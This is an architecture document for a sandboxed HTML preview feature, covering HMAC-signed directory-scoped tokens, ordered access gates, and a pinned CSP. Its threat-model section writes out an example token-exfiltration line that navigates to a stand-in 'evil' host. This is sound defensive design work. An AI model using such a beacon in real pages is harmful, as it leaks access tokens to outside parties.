# MDT-221 — Architecture

> Human-authored architecture narrative. Canonical trace data lives in the
> `spec-trace` store; `architecture.trace.md` is its projection. This document
> holds the diagrams and reasoning the projection cannot.

## 1. Data structures first (the design lives here)

### 1.1 `DocumentFile.kind` — server-owned discriminator

The CR's headline data-structure decision (Section 4, line 91) is correct: the
**server owns kind derivation**. The client never re-derives from an extension.
This kills the "two places decide what a file is" drift that the Torvalds pass
correctly flagged.

```text
server/types/tree.ts
  type DocumentKind = 'markdown' | 'html'   // 'unsupported' is NOT stored

interface TreeNode {
  name: string
  path: string
  type: 'file' | 'folder'
  kind?: DocumentKind      // NEW — only present on file nodes; folders stay undefined
  children?: TreeNode[]
  favorite?: boolean
  favoritedAt?: string
}
```

**Why `kind?` is optional and `unsupported` is not stored.** The set of kinds
the *server can derive* is `{ markdown, html }` for v1. A file the server does
not recognize simply has no `kind`. The *viewer boundary* decides
"no kind → unsupported state." This is the CR's line 48 decision, and it is the
right shape: don't persist a negative category that has no renderer. The client
maps `undefined → 'unsupported'` at the viewer switch. One conversion, one
place.

**Why not an enum with `unsupported` as a member.** That would force every
future file type (pdf, svg, png) to either be added to the enum or be silently
mis-categorized. Optional `kind` says exactly what it means: "the server knows
how to classify this, or it doesn't."

### 1.2 Preview token payload — the security-critical struct

```text
server/security/documentPreviewToken.ts
  PreviewTokenPayload {
    exp: number      // unix seconds; CR AC: <= 300 (5 min)
    iat: number
    projectId: string
    docDir: string   // project-relative, normalized; the ONLY path the token grants
    v: 1             // payload version, for forward-compat revocation
  }

  Signed token string = base64url(payload) + '.' + base64url(HMAC-SHA256(payload, secret))
```

**Critical design rule (this is the whole security argument):** the token
grants exactly one directory, `docDir`. Every raw-preview subresource request
re-derives the project-relative path of the requested file and asserts it is
inside `docDir`. The CR's AC 2.11 ("cannot read sibling files outside the
token-scoped directory") is enforced by **data**, not by branching: if the
normalized requested path does not start with `docDir + '/'` (or equal it),
reject. One comparison.

**`docDir`, not `docPath`.** The token is scoped to the *directory* of the
selected HTML file, not the file itself. This is deliberate: relative
subresources (`style.css`, `app.js`) live as siblings. Scoping to the file
would make multi-file HTML impossible. The CR's AC 1.8 requires this.

**Why HMAC, not encrypted.** We don't need confidentiality — the token appears
in a URL the same origin already controls. We need *integrity* (tamper
detection) and *expiry*. HMAC-SHA256 with a server secret gives both. The
existing `apiSession.ts:130 signPayload` already does exactly this pattern;
reuse the idiom, not necessarily the file.

**Why not reuse the owner-session cookie secret.** Separation of concerns. If
the cookie secret rotates (it doesn't today, but `invalidateOwnerSessions` at
`apiSession.ts:75` is the precedent), preview tokens should not be coupled to
it. A dedicated `PREVIEW_TOKEN_SECRET` (with a stable default for local
single-user) keeps the blast radius contained.

### 1.3 Raw-preview request shape

```text
GET /api/documents/raw-preview/:token/*documentPath
                              ^^^^^^^ ^^^^^^^^^^^^^^
                              signed   project-relative path under docDir
```

The token lives in the **path prefix**, not a query param (CR AC 3.7 / Edge-3.7).
This is not cosmetic: relative subresources in the HTML resolve as
`raw-preview/:token/<sibling>` because the browser treats the iframe's URL as
the base. A query param would not propagate to relative asset requests.

## 2. Request flow — two distinct paths

The CR conflates "the raw route" as if it's one path. It is **two** paths with
**different auth** and **different gates**. Conflating them is how you ship a
hole.

```text
                       ┌─────────────────────────────────────────────┐
PATH A — TOKEN MINT     │  POST /api/documents/preview-token          │
(owner, credentialed)   │                                              │
                        │  React parent (same-origin, has cookie)     │
                        │     │                                        │
                        │     │  fetch(..., credentials:'include')     │
                        │     ▼                                        │
                        │  createApiAuthMiddleware (mounted /api)      │
                        │     │  → owner-session cookie verified       │
                        │     │  → mode='owner-admin', canWrite=true   │
                        │     ▼                                        │
                        │  requireVisibleProject                      │
                        │     │  → ensureProjectVisible(projectId)    │
                        │     ▼                                        │
                        │  DocumentController.mintPreviewToken        │
                        │     │  → reject if read-token/shared session │
                        │     │  → resolve HTML path, derive docDir    │
                        │     │  → sign PreviewTokenPayload            │
                        │     ▼                                        │
                        │  200 { token, expiresAt }                   │
                        └─────────────────────────────────────────────┘

                       ┌─────────────────────────────────────────────┐
PATH B — RAW SERVE      │  GET /api/documents/raw-preview/:token/*    │
(opaque iframe, no      │                                              │
 cookies carry)         │  <iframe sandbox="allow-scripts">           │
                        │     │  (opaque origin; SameSite=Strict      │
                        │     │   cookie NOT sent on subresources)     │
                        │     ▼                                        │
                        │  createApiAuthMiddleware                    │
                        │     │  → GET exemption for this prefix only  │
                        │     │    (CR AC 2.17; narrow, not broad)     │
                        │     ▼                                        │
                        │  DocumentController.serveRawPreview         │
                        │     │  1. verify HMAC signature (reject →   │
                        │     │     403 before ANY fs work)            │
                        │     │  2. check exp (reject → 403)           │
                        │     │  3. normalize requested *documentPath  │
                        │     │  4. assert requested path inside       │
                        │     │     payload.docDir  ← THE scope gate   │
                        │     │  5. assert inside configured           │
                        │     │     documentPaths                      │
                        │     │  6. assert inside project root         │
                        │     │     (isInsideProjectPath)              │
                        │     │  7. MIME lookup; unknown → 415         │
                        │     │  8. set nosniff + pinned CSP +         │
                        │     │     X-Frame-Options: SAMEORIGIN        │
                        │     │     (override global DENY)             │
                        │     │  9. stream bytes (createReadStream)    │
                        │     ▼                                        │
                        │  200 body | 403 | 404 | 415                 │
                        └─────────────────────────────────────────────┘
```

**The two-path distinction is the security model.** Path A has the cookie;
Path B does not and cannot rely on it. The token is the *only* bridge between
them. If an implementer tries to "simplify" by putting raw-serve behind normal
cookie auth, multi-file HTML breaks (the original contradiction). If they
" simplify" by exempting the whole prefix without token validation, any
same-origin caller can read any file. Neither is acceptable.

## 3. The gates, in order — and why order matters

```text
request arrives
   │
   ▼
[G1] API auth middleware: GET exemption for /api/documents/raw-preview/*
        pass-through; no credential check. Narrow. CR AC 2.17.
   │
   ▼
[G2] HMAC signature valid?           ── no ──→ 403 (before any fs op)
   │ yes                                      (CR AC 2.8, Edge-3.2)
   ▼
[G3] exp > now?                      ── no ──→ 403
   │ yes                                      (Edge-3.1)
   ▼
[G4] decode projectId from payload;  ── no ──→ 404
     project exists?                          (CR AC 2.3)
   │ yes
   ▼
[G5] normalize requested *documentPath (reuse DocumentService.normalizeRelativePath)
   │
   ▼
[G6] requested path inside payload.docDir?  ── no ──→ 403
   │ yes                                             (CR AC 2.11, Edge-3.4)
   ▼                                                  ← THE token-scope gate
[G7] requested path inside configured documentPaths? ── no ──→ 403
   │ yes                                             (CR AC 2.1)
   ▼
[G8] resolved real path inside project root?  ── no ──→ 403
   │ yes                                             (CR AC 2.2, Edge-3.5)
   ▼                                                  (catches symlink escapes too)
[G9] MIME known?                              ── no ──→ 415
   │ yes                                             (CR AC 2.19)
   ▼
[G10] set X-Frame-Options: SAMEORIGIN (override global DENY from securityHeaders)
   │                                                (CR C-2.22)
   ▼
[serve] nosniff + pinned CSP + stream bytes
```

**G10 is non-negotiable.** The global `securityHeaders` middleware
(`originPolicy.ts:103-107`, mounted at `server.ts:150`) sets
`X-Frame-Options: DENY` on every response. DENY blocks even same-origin
framing, so the iframe would be refused by the browser before any script runs.
The raw-preview handler MUST override to `SAMEORIGIN` on its responses (the
iframe is same-origin by URL; sandbox isolation is unaffected because XFO
checks the navigation URL origin, not the post-sandbox effective origin).

**Why signature check (G2) is before project resolution (G4).** A signature
failure costs one HMAC compare. A project lookup hits the registry. Order by
cost and by information leakage: reject unsigned garbage before touching the
filesystem or the project registry. No absolute paths in error bodies (CR AC
Edge-3.9).

**Why docDir scope (G6) is before configured-paths check (G7).** G6 is the
token's own claim — cheap, self-contained. G7 requires loading project config.
Reject the cheap negative first.

### 3.1 The public-read carve-out — defense in depth, not a broken gate

`server/security/accessPolicy.ts:19-27` `isPublicReadRoute` returns true for any
safe GET/HEAD/OPTIONS under `/api/documents*`. So as written,
`/api/documents/raw-preview/*` inherits anonymous + read-session readability
from the broad `/api/documents` public-read rule.

**Important: this is NOT because the token gate is broken.** The handler's HMAC
signature check (gate G2) is the primary gate and works regardless of how the
request was admitted by the auth middleware. The carve-out exists for two
defense-in-depth reasons:

1. **Hidden broad pass-through.** Without the carve-out, the raw-preview prefix
   is a quiet anonymous/read-session-readable surface, merely *appearing* to be
   gated by the handler. Defense-in-depth says the route should not be
   reachable as anonymous-read at all; the token should be the only credential
   path that grants entry.
2. **Method creep.** `isPublicReadRoute` admits GET, HEAD, and OPTIONS
   (`isSafeReadMethod`, accessPolicy.ts:15-17). The raw-preview GET-only
   exemption in `isApiAuthExemptRoute` (apiAuth.ts:51-57) is the method-creep
   guard — it admits the request to the handler only for GET. The two changes
   work together: carve-out removes the broad public-read grant; GET-only
   exemption re-admits the request narrowly so the handler can enforce the
   token.

**The fix** (two coordinated changes):

```text
accessPolicy.ts isPublicReadRoute:
  if (path.startsWith('/api/documents/raw-preview')) return false   // carve-out

apiAuth.ts isApiAuthExemptRoute (already GET-gated):
  return EXEMPT_API_ROUTES.has(path)
      || path.startsWith('/api/documents/raw-preview/')             // GET-only
```

## 4. Discovery — the CR missed a file

The CR's "Affected Artifacts" names `TreeBuilder.ts` for discovery. That is
**half the truth**. There are two discovery code paths:

```text
TreeService.getDocumentTree(projectId)
   │
   ├─► new TreeBuilder(strategy)
   │     │
   │     ├─► glob('**/*.md', ...)          ← PATH 1: glob-based (TreeBuilder.ts:47)
   │     │     then strategy.buildTree(...)
   │     │
   │     └─► strategy = PathSelectionStrategy   (for path-selection UI only)
   │
   └─► (TreeBuilder delegates to strategy.buildTree)
                              │
                              └─► walks dirs, entry.name.endsWith('.md')  ← PATH 2 (PathSelectionStrategy.ts:93)
```

Both paths hardcode `.md`. The CR only lists `TreeBuilder.ts`. **Path 2
(`PathSelectionStrategy.ts`) is a missing artifact** — without changing it, the
path-selection UI (PathSelector modal) will not offer `.html` files, so the
user cannot even *configure* a document path that points at an HTML file they
then expect to discover. This is a real gap; it must be added to the CR's
Modified Artifacts table.

**Root `index.html` exclusion.** The exclusion (CR AC 1.2, Edge-3.8) belongs
in `TreeBuilder`'s ignore filter, right next to `shouldIgnorePath`. The rule is
narrow and explicit: skip a file whose project-relative path is exactly
`index.html` (root only — `docs/index.html` is fine). One line, one place.

## 5. MIME and CSP — the two pinned artifacts

### MIME (hand-rolled map, no dependency)

```text
const RAW_MIME: Record<string, string> = {
  '.html': 'text/html; charset=utf-8',
  '.htm':  'text/html; charset=utf-8',
  '.css':  'text/css; charset=utf-8',
  '.js':   'text/javascript; charset=utf-8',
  '.mjs':  'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png':  'image/png',
  '.jpg':  'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif':  'image/gif',
  '.webp': 'image/webp',
  '.svg':  'image/svg+xml',
  '.ico':  'image/x-icon',
  '.woff': 'font/woff',
  '.woff2':'font/woff2',
}
// unknown extension → 415 Unsupported Media Type (CR AC 2.19)
```

`.svg` is in the map (CR AC 2.19). **SVG can carry `<script>`.** But the pinned
CSP below has `default-src 'none'` with no `object-src` override, so
`<object>`/`<embed>` SVG loading is blocked, and `<img>`-loaded SVG cannot
execute. The data structure (the CSP) already closes the vector. Worth a
one-line comment so a future reader does not "helpfully" relax `default-src`.

### Pinned CSP (from CR Section 4, line 161)

```text
Content-Security-Policy:
  sandbox allow-scripts;
  default-src 'none';
  script-src 'self' 'unsafe-inline';
  style-src  'self' 'unsafe-inline';
  img-src    'self' data:;
  font-src   'self';
  connect-src 'none';      ← closes the /api/* network channel
  base-uri   'none';       ← blocks <base> tag URL hijacking
  form-action 'none';      ← blocks form POST exfiltration
```

**Set on every raw-preview response, not just HTML.** CSS/JS/PNG responses
getting these headers is harmless (a `.js` file's own CSP does not govern its
execution context — the embedding document's CSP does). MIME-branching the
header logic is special-case insanity. Set it uniformly.

> **⚠️ v1 deviation:** the strict CSP above is canonical, but v1 ships a
> documented relaxation (external CDN allowlist + `unsafe-eval`) so real working
> HTML depending on Tailwind/Alpine/Google Fonts can render. The non-negotiable
> directives (`connect-src 'none'`, `img-src 'self' data:`, `default-src 'none'`,
> no `allow-same-origin`) are unchanged and asserted as invariants. Full
> rationale + the per-project configuration follow-up in
> `docs/CRs/MDT-221/security-tradeoffs.md`.

**Two unsolved limitations to call out as accepted v1 trade-offs** (not bugs):
1. `connect-src 'none'` does not stop `window.location = 'https://evil/?...'`
   self-navigation exfiltration. The token is in the URL; a malicious HTML
   file (which, recall, is *the owner's own file* in v1) could beacon it
   outbound. 5-min TTL + owner-only + scoped to one dir bounds the risk. A
   follow-up could add `sandbox` navigation restrictions. Documented here, not
   silently absorbed.
2. No active token revocation on logout. `invalidateOwnerSessions()`
   (apiSession.ts:75) bumps cookie generation but does nothing to outstanding
   HMAC preview tokens. TTL is the bound. Acceptable for v1.

## 6. Frontend component boundaries

```text
DocumentsLayout (existing)
   │  selects viewer by selectedFile.kind
   │
   ├─ kind === 'markdown'  ─► MarkdownViewer      (UNCHANGED — markdown-only)
   ├─ kind === 'html'      ─► HtmlSandboxViewer   (NEW)
   └─ kind === undefined   ─► UnsupportedViewer   (NEW, trivial placeholder)
```

**`HtmlSandboxViewer` responsibilities, scoped tight:**

```text
on mount / on file change:
  1. POST /api/documents/preview-token  { projectId, filePath }
  2. on 200 → set iframe src = `/api/documents/raw-preview/${token}/${filePath}`
  3. on 401/403 → render "preview unavailable" state (do NOT fall back to markdown)
  4. subscribe to document:file:changed for the selected path → reload iframe

iframe attributes (HARD RULE):
  sandbox="allow-scripts"     ← NEVER allow-same-origin; NEVER allow-top-navigation
  referrerpolicy="no-referrer"
  loading="lazy"
```

**The hard rule is data, not a comment.** The component must not accept a
`sandbox` prop from callers. It hardcodes the token string. A unit test
(`HtmlSandboxViewer.test.tsx`, CR AC 3.6) asserts the rendered iframe's
`sandbox` attribute does not contain `allow-same-origin`. If someone later
adds it, the test fails. That is the contract; comments rot, tests don't.

## 7. What this architecture does NOT do (accepted scope)

- No editing/saving HTML (CR out-of-scope).
- No public/signed share URLs (CR out-of-scope; preview token is internal-only,
  not the same mechanism).
- No read-token/shared-session preview (CR out-of-scope v1; threat-model
  expansion deferred to MDT-199 follow-up).
- No PDF/image/SVG/video viewers (CR out-of-scope; the raw route *serves* them
  but no viewer renders them — they hit UnsupportedViewer).

## 8. Durable documents the CR does not mention (gaps to flag)

The CR's "Modified Artifacts" names `docs/CONFIG_SPECIFICATION.md` but misses
three other durable docs that this change touches:

| Durable doc | Why it needs updating | Status in CR |
|---|---|---|
| `docs/CONFIG_SPECIFICATION.md` | Document kinds + raw-preview security boundary | ✅ already listed |
| `server/docs/ARCHITECTURE.md` | The auth-gate + route map (lines 13, 56-65, 90) must reflect the new raw-preview prefix, its GET-only exemption, and the preview-token bridge. This doc is the canonical "where do new /api routes go" reference. | ❌ MISSING from CR |
| `server/openapi/schemas.ts` | The `Document` schema (line 388) gains an optional `kind` field; a new `PreviewTokenResponse` schema and two new operations (`POST /preview-token`, `GET /raw-preview/{token}/{path}`) must be declared. The OpenAPI/Redoc spec at `/api-docs` will otherwise drift from reality. | ❌ MISSING from CR |
| `DEBUG.md` | If the runtime debugging doc lists observation channels or routes, the raw-preview prefix and the preview-token TTL/secret env should appear for operational debugging. | ⚠️ Verify; likely needs a line. |

**Recommendation:** amend MDT-221's "Modified Artifacts" to include
`server/docs/ARCHITECTURE.md` and `server/openapi/schemas.ts` as required
updates, and verify `DEBUG.md` coverage. These are not optional polish — the
architecture doc is the reference future contributors use to place new routes,
and the OpenAPI spec is the contract the Redoc UI renders.
